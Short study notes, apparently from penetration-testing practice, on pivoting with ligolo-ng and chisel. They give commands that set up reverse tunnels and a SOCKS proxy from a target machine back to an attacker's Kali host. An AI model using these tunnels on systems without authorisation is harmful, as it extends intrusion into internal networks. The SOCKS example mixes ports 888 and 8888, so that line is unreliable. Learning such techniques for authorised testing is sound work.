## LIGOLO-NG

Proxy - KALI:
- sudo ip tuntap add user kali mode tun ligolo
- sudo ip link set ligolo up 
	- sudo ip route add 240.0.0.1/32 dev ligolo
		- adds port forwarding, can now access through 240.0.0.1
- sudo ligolo-proxy -selfcert

Agent - TARGET:
	./agent.exe (or respective linux binary, if windows make sure have wintun.dll)
	agent -connect {kali ip}:11601 -ignore-cert

KALI:
- session
- autoroute (and start tunnel)

- medium guide to pivoting using ligolo ng is great for double pivots, port forwarding explanation, need to make notes here

## CHISEL
Listener/Server - KALI
- ./chisel server -p 9999 --reverse
Client - Target
- chisel client {KALI IP}:9999 R:LOCAL_PORT:TARGET_IP:TARGET_PORT
- Target IP and Port are for the service trying to reach

Example:
- Kali: ./chisel server -p 9999 --reverse
- Target: chisel client {KALI IP}:9999 R:8000:127.0.0.1:8000
Then to access, use 127.0.0.1 and whatever port assigned

Also for socks proxy:
- kali:./chisel server -p 888 --reverse
- target:./chisel.exe client <kaliip>:8888 R:socks
- proxychains.conf socks5 127.0.0.1 1080